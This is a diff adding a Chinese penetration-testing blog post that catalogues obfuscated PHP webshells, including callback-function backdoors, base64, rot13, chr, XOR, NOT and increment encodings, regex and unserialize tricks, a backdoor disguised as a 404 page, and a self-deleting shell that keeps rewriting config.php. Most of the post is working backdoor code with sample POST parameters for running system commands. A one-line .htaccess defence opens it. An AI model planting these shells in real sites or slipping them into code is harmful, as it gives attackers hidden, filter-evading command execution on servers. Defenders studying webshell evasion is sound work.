@@ -252,6 +252,179 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/22/PHP花式WEBSHELL/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/22/PHP花式WEBSHELL/" itemprop="url">PHP花式WEBSHELL</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-22T21:29:21+08:00">
+                2019-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>PHP可通过回调函数、可变函数、拆分重组、base64编码、rot13加密、chr编码、注释、运算（异或、取反、自增等）、正则函数、session机制、referer、php反射、php反序列化、404马、php内存马等形式生成webshell。</p>
+<p>防护:在要防护的目录下上传如下.htaccess，禁止该目录运行php文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;.php&quot;&gt;</span><br><span class="line">Order allow,deny</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="1-回调函数"><a href="#1-回调函数" class="headerlink" title="1)    回调函数"></a>1)    回调函数</h3><p>php中包含回调（callable类型）函数参数的函数，基本都可能用做后门。</p>
+<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	call_user_func($_REQUEST[&apos;a1&apos;],$_REQUEST[&apos;a2&apos;]);</span><br><span class="line">	//POST: a1=system&amp;a2=whoami  //命令执行</span><br><span class="line">	///POST: a1=assert&amp;a2=phpinfo()   //代码执行</span><br><span class="line">	//caidao: ***.php?a1=assert  pass:a2</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="register-shutdown-function"><a href="#register-shutdown-function" class="headerlink" title="register_shutdown_function()"></a>register_shutdown_function()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a = $_REQUEST[&apos;a&apos;];</span><br><span class="line">register_shutdown_function($a, $_REQUEST[&apos;www&apos;]);</span><br><span class="line"></span><br><span class="line">// POST: a=assert&amp;www=phpinfo()</span><br><span class="line">// caidao:   ***.php?a=assert  pass:www</span><br></pre></td></tr></table></figure>
+<h4 id="register-tick-function"><a href="#register-tick-function" class="headerlink" title="register_tick_function()"></a>register_tick_function()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_REQUEST[&apos;a&apos;];</span><br><span class="line">declare(ticks=1);</span><br><span class="line">register_tick_function ($a, $_REQUEST[&apos;www&apos;]);</span><br><span class="line"></span><br><span class="line">// POST: a=assert&amp;www=phpinfo()</span><br></pre></td></tr></table></figure>
+<h4 id="filter-var-amp-filter-var-array"><a href="#filter-var-amp-filter-var-array" class="headerlink" title="filter_var()&amp;filter_var_array()"></a>filter_var()&amp;filter_var_array()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">filter_var($_REQUEST[&apos;www&apos;], FILTER_CALLBACK, array(&apos;options&apos; =&gt; &apos;assert&apos;));</span><br><span class="line">//filter_var_array(array(&apos;test&apos; =&gt; $_REQUEST[&apos;www&apos;]), array(&apos;test&apos; =&gt; array(&apos;filter&apos; =&gt; FILTER_CALLBACK, &apos;options&apos; =&gt; &apos;assert&apos;)));</span><br><span class="line"></span><br><span class="line">//POST: www=phpinfo()</span><br></pre></td></tr></table></figure>
+<h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&apos;e&apos;];</span><br><span class="line">$arr = array($_POST[&apos;www&apos;],);</span><br><span class="line">array_filter($arr, base64_decode($e));</span><br><span class="line">//caidao:  ***.php?e=YXNzZXJ0  pass:www    YXNzZXJ0为assert的base64编码</span><br><span class="line">//***.php  POST数据  e=YXNzZXJ0&amp;www=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @array_map(assert,(array)base64_decode($_REQUEST[&apos;e&apos;]));</span><br><span class="line">//caidao: ***.php?e=YXNzZXJ0KCRfUkVRVUVTVFsnd3d3J10p  pass:www    YXNzZXJ0KCRfUkVRVUVTVFsnd3d3J10p解码为assert($_REQUEST[&apos;www&apos;])</span><br><span class="line">//POST: e=cGhwaW5mbygp   cGhwaW5mbygp解码为phpinfo()</span><br></pre></td></tr></table></figure>
+<h3 id="2-拆分重组"><a href="#2-拆分重组" class="headerlink" title="2)    拆分重组"></a>2)    拆分重组</h3><h4 id="拆分重组示例1"><a href="#拆分重组示例1" class="headerlink" title="拆分重组示例1"></a>拆分重组示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  $req = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;$req($_POST[&quot;www&quot;]); </span><br><span class="line">//POST: www=phpinfo()</span><br><span class="line">//caidao: ***.php pass:www</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="拆分重组合示例2"><a href="#拆分重组合示例2" class="headerlink" title="拆分重组合示例2"></a>拆分重组合示例2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $xy = &quot;eval&quot;; $xy .= &quot;(&quot;;$xy .= &quot;$&quot;;$xy .= &quot;_PO&quot;;$xy .= &quot;ST[&apos;www&apos;]);&quot;;@eval($xy);</span><br><span class="line">//caidao: ***.php pass:www</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="3-base64编码-可变函数"><a href="#3-base64编码-可变函数" class="headerlink" title="3)    base64编码+可变函数"></a>3)    base64编码+可变函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//$a = @base64_decode($a=$_POST[&apos;fun&apos;]);$a($_POST[&apos;www&apos;]);</span><br><span class="line">$a = @base64_decode($a=$_REQUEST[&apos;fun&apos;]);$a($_REQUEST[&apos;www&apos;]);</span><br><span class="line">//POST: fun=YXNzZXJ0&amp;www=phpinfo()</span><br><span class="line">//caidao: fun=YXNzZXJ0  pass:www</span><br><span class="line">//base64编码+可变函数</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="4-rot13加密-可变函数"><a href="#4-rot13加密-可变函数" class="headerlink" title="4)    rot13加密+可变函数"></a>4)    rot13加密+可变函数</h3><h4 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a=str_rot13(&apos;nffreg&apos;);$a($_POST[&apos;www&apos;]);</span><br><span class="line">//nffreg为assert的rot13加密</span><br><span class="line">//POST: www=phpinfo()</span><br><span class="line">//rot13加密+可变函数</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="示例2-ye版"><a href="#示例2-ye版" class="headerlink" title="示例2-ye版"></a>示例2-ye版</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">……</span><br></pre></td></tr></table></figure>
+<h3 id="5-chr编码"><a href="#5-chr编码" class="headerlink" title="5)    chr编码"></a>5)    chr编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">assert(chr(97).chr(115).chr(115).chr(101).chr(114).chr(116).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(120).chr(93).chr(41)); </span><br><span class="line">// chr解出来是assert($_POST[x])</span><br><span class="line">//POST: x=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="6-注释符"><a href="#6-注释符" class="headerlink" title="6)    注释符"></a>6)    注释符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$_=&quot;s&quot;.&quot;s&quot;./*-/*-*/&quot;e&quot;./*-/*-*/&quot;r&quot;;</span><br><span class="line">@$_=/*-/*-*/&quot;a&quot;./*-/*-*/$_./*-/*-*/&quot;t&quot;;</span><br><span class="line">@$_/*-/*-*/($/*-/*-*/&#123;&quot;_P&quot;./*-/*-*/&quot;OS&quot;./*-/*-*/&quot;T&quot;&#125;</span><br><span class="line">[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); </span><br><span class="line"></span><br><span class="line">// 密码 -7</span><br><span class="line">// POST：-7=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="7-运算符"><a href="#7-运算符" class="headerlink" title="7)    运算符"></a>7)    运算符</h3><h4 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    @$_++; // $_ = 1</span><br><span class="line">    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _</span><br><span class="line">    $__.=(&quot;.&quot;^&quot;~&quot;); // _P</span><br><span class="line">    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO</span><br><span class="line">    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS</span><br><span class="line">    $__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);</span><br><span class="line">	</span><br><span class="line">	//POST: 0=assert&amp;1=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="取反运算"><a href="#取反运算" class="headerlink" title="取反运算"></a>取反运算</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;&apos;;</span><br><span class="line">$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br><span class="line"></span><br><span class="line">//POST: 2=phpinfo();</span><br></pre></td></tr></table></figure>
+<h4 id="自增运算"><a href="#自增运算" class="headerlink" title="自增运算"></a>自增运算</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;</span><br><span class="line">$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;_&apos;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br><span class="line"></span><br><span class="line">//POST: _=phpinfo()</span><br></pre></td></tr></table></figure>
+<h3 id="8-正则函数"><a href="#8-正则函数" class="headerlink" title="8)    正则函数"></a>8)    正则函数</h3><h4 id="mb-ereg-replace"><a href="#mb-ereg-replace" class="headerlink" title="mb_ereg_replace()"></a>mb_ereg_replace()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php mb_ereg_replace(&apos;.*&apos;, $_REQUEST[&apos;www&apos;], &apos;&apos;, &apos;e&apos;); ?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="preg-filter"><a href="#preg-filter" class="headerlink" title="preg_filter()"></a>preg_filter()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo preg_filter(&apos;|.*|e&apos;, $_REQUEST[&apos;www&apos;], &apos;&apos;); ?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="9-利用session"><a href="#9-利用session" class="headerlink" title="9)    利用session"></a>9)    利用session</h3><p>利用session机制 需要读取服务器session文件权限<br>POST: www=cGhwaW5mbygpOw==      cGhwaW5mbygpOw==解码为phpinfo();<br>在C:\Windows\sess_k12th0l3kimv4i07fi0lm1bjr3 文件中写入cmd|s:16:”cGhwaW5mbygpOw==”;<br>C:\Windows\sess_之后的值与cookie 中的 PHPSESSID值一样 </p>
+<p>php的session文件的保存路径在php.ini中设置 或者可以在phpinfo()的session.save_path查看<br>session文件的命名规则是 sess_[PHPSESSID]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">session_start();$_SESSION[&apos;cmd&apos;] = trim($_POST[&apos;www&apos;]);</span><br><span class="line">echo preg_replace(&apos;\&apos;a\&apos;eis&apos;,&apos;e&apos;.&apos;v&apos;.&apos;a&apos;.&apos;l&apos;.&apos;(base64_decode($_SESSION[\&apos;cmd\&apos;]))&apos;,&apos;a&apos;);</span><br><span class="line"></span><br><span class="line">//POST: www=cGhwaW5mbygpOw==      cGhwaW5mbygpOw==解码为phpinfo();</span><br><span class="line">//var_dump($_SESSION);</span><br><span class="line">//var_dump($_COOKIE[&apos;PHPSESSID&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="10-利用referer"><a href="#10-利用referer" class="headerlink" title="10)    利用referer"></a>10)    利用referer</h3><p>refer1.php+refer2.php两个文件组成构成后门，访问后门是访问refer2.php<br>refer1.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//refer1.php  refer1.php+refer2.php两个文件组成构成后门，访问后门是访问refer2.php</span><br><span class="line">header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">parse_str($_SERVER[&apos;HTTP_REFERER&apos;], $a);</span><br><span class="line">if(reset($a) == &apos;10&apos; &amp;&amp; count($a) == 9) &#123;</span><br><span class="line">   eval(base64_decode(str_replace(&quot; &quot;, &quot;+&quot;, implode(array_slice($a, 6)))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>refer2.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//refer2.php  直接访问refer2.php</span><br><span class="line">header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">//要执行的代码</span><br><span class="line">$code = &lt;&lt;&lt;CODE</span><br><span class="line">phpinfo();</span><br><span class="line">CODE;</span><br><span class="line">//进行base64编码</span><br><span class="line">$code = base64_encode($code);</span><br><span class="line">//构造referer字符串</span><br><span class="line">$referer = &quot;a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g=&#123;$code&#125;&amp;h=&amp;i=&quot;;</span><br><span class="line">//后门url</span><br><span class="line">$url = &apos;http://localhost/phpcode2019/phpwebshell/r1.php&apos;;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">$options = array(</span><br><span class="line">    CURLOPT_URL =&gt; $url,</span><br><span class="line">    CURLOPT_HEADER =&gt; FALSE,</span><br><span class="line">    CURLOPT_RETURNTRANSFER =&gt; TRUE,</span><br><span class="line">    CURLOPT_REFERER =&gt; $referer</span><br><span class="line">);</span><br><span class="line">curl_setopt_array($ch, $options);</span><br><span class="line">echo curl_exec($ch);</span><br></pre></td></tr></table></figure></p>
+<h3 id="11-PHP反射"><a href="#11-PHP反射" class="headerlink" title="11)    PHP反射"></a>11)    PHP反射</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$func = new ReflectionFunction($_POST[&apos;a&apos;]);</span><br><span class="line">echo $func-&gt;invokeArgs(array($_POST[&apos;b&apos;]));</span><br><span class="line">//POST:a=assert&amp;b=phpinfo()</span><br><span class="line">//php反射特性</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="12-PHP反序列化"><a href="#12-PHP反序列化" class="headerlink" title="12)    PHP反序列化"></a>12)    PHP反序列化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class shell&#123;</span><br><span class="line">    public $code=&quot;tmpdata&quot;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">       assert($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ser = $_GET[&apos;www&apos;];</span><br><span class="line">unserialize($ser);</span><br><span class="line">//?www=O:5:&quot;shell&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>生成序列化POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class shell&#123;</span><br><span class="line">    public $code=&quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$reload = new shell;</span><br><span class="line">$res = serialize($reload);</span><br><span class="line">echo $res;</span><br><span class="line">//输出 O:5:&quot;shell&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="line">//生成序列化POC</span><br></pre></td></tr></table></figure></p>
+<h3 id="13-404马"><a href="#13-404马" class="headerlink" title="13)    404马"></a>13)    404马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">@call_user_func($_REQUEST[&apos;a1&apos;],$_REQUEST[&apos;a2&apos;]);</span><br><span class="line">header(&apos;HTTP/1.1 404 Not Found&apos;);</span><br><span class="line">	//POST: a1=system&amp;a2=whoami  //命令执行</span><br><span class="line">	///POST: a1=assert&amp;a2=phpinfo()   //代码执行</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="14-内存马"><a href="#14-内存马" class="headerlink" title="14)    内存马"></a>14)    内存马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //php内存马 //处理办法:重启Apache</span><br><span class="line">    set_time_limit(0);      //设置脚本最大执行时间  设置为0，没有时间限制</span><br><span class="line">    ignore_user_abort(1);   //设置客户端断开连接时是否中断脚本的执行  设置为1则不会中断执行</span><br><span class="line">    unlink(__FILE__); //删除自身</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        file_put_contents(&apos;D:\\phpStudy\\***\\config.php&apos;,&apos;&lt;?php call_user_func($_REQUEST[&quot;a1&quot;],$_REQUEST[&quot;a2&quot;]);?&gt;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br><a href="https://joychou.org/web/webshell.html#directory025622261147745225" target="_blank" rel="noopener">https://joychou.org/web/webshell.html#directory025622261147745225</a><br><a href="https://klionsec.github.io/2017/10/11/bypasswaf-for-webshell/" target="_blank" rel="noopener">https://klionsec.github.io/2017/10/11/bypasswaf-for-webshell/</a><br><a href="https://www.freebuf.com/articles/web/9396.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/9396.html</a>  </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/17/PHP命令执行&代码执行/">
 
